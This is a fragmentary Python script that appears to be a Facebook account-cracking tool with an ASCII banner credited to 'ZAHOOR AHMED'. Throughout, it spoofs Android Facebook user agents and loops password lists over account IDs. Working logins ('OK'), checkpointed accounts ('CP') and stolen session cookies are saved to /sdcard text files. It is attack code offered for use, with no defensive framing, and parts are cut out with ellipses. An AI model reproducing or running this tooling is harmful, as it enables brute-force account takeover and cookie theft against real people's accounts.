...
os.system('xdg-open https://www.facebook.com/profile.php?id=100082942527060')
...
def S1():
	...
	s= "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)};  Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)})"+"[FBAN/"+"FB4A;FBAV/"+str(random.randint(11,77))+".0.0."+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
	e = "(Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/509523294;FBAV/370.0.0.16.116;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]"
	ua = s + e 
	return ua
...
\033[1;92m _______  _______           _______  _______  _______   
\033[1;36m/ ___   )(  ___  )|\     /|(  ___  )(  ___  )(  ____ )  
\033[1;34m/   )  || (   ) || )   ( || (   ) || (   ) || (    )|  
\033[1;32m   /   )| (___) || (___) || |   | || |   | || (____)|  
\033[1;37m   /   / |  ___  ||  ___  || |   | || |   | ||     __)  
\033[1;92m  /   /  | (   ) || (   ) || |   | || |   | || (\ (     
\033[1;36m /   (_/\| )   ( || )   ( || (___) || (___) || ) \ \__  
\033[1;34m(_______/|/     \||/     \|(_______)(_______)|/   \__/  
                                                        
\033[1;32m════════════════════════════════════════════════════
\033[1;34mAUTHER    \033[1;34m  :   \033[1;34m ZAHOOR AHMED 
FACEBOOK   \033[1;92m :    \033[1;36mKHØSØ  ZAHOOR 
STATUS  \033[1;92m    :  \033[1;392m  Prsenal 
VERSION  \033[1;37m   :   \033[1;37m 0.9
\033[1;32m════════════════════════════════════════════════════""")                              
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mZAHOOR \x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                print('\r\r\033[1;32m [ZAHOOR -OK] %s | %s'%(ids,pas))
                                open('/sdcard/ZAHOOR -OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ZAHOOR -OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                              
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        print('\r\r\033[1;37m [ZAHOOR -CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ZAHOOR -CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api1(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mZAHOOR \x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [ZAHOOR -OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				#print('\033[1;37m [🍪] Cookies :- '+cookies)
				open('/sdcard/ZAHOOR -OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [ZAHOOR -CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/ZAHOOR -CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def rd(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mZAHOOR \x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
		for pas in passlist:                                          
			...
			if 'session_key' in po:
				...
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)                                                                                                                                                
				open('/sdcard/ZAHOOR -R-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
				oks.append(uid)
				...
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [ZAHOOR -CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/ZAHOOR -R-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
    ...
    try:
        for ps in passlist:            
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [ZAHOOR -OK] '+ids+' | '+ps)                
                print('\033[1;37m [🍪] Cookies :- '+coki)                
                open('/sdcard/ZAHOOR -BD-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(f'\r\r\033[1;33m [ZAHOOR -CP] '+ids+' | '+ps+'\033[1;97m')
                open('/sdcard/ZAHOOR -BD-CP.txt', 'a').write( ids+' | '+ps+' \n')
                cps.append(cid)
            elif twf in session.cookies.get_dict().keys():
                print('\033[1;93m\033[0;34mZAHOOR -2F '+ids+' • '+ps+'  \033[0;97m')
                break
            else:
                continue
        loop+=1
...
def newidx(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mZAHOOR \x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
